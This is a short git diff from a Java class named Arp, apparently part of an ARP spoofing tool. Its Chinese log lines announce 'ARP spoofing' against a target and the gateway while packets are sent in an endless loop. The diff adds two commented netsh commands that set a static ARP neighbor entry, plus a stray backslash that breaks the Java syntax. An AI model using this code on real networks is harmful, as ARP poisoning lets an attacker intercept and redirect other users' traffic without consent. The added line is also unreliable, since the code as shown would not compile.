@@ -64,7 +64,9 @@ public class Arp {
             // 发送ARP应答包
             while (true) {
                 logger.info("进行arp欺诈  >>>>>  欺诈目标:{},数据包转发目标:{}", destIp.getHostAddress(), device.addresses[1].address.getHostAddress());
-                sender.sendPacket(arp);
+                sender.sendPacket(arp);\
+                //netsh i i show in
+                //netsh -c "i i" add neighbors 11 "192.168.100.13" "f8-2d-7c-cf-f4-d2"
                 logger.info("进行arp欺诈  >>>>>  欺诈目标:{},数据包转发目标:{}", gateIp.getHostAddress(), device.addresses[1].address.getHostAddress());
                 sender.sendPacket(arpGate);
                 try {
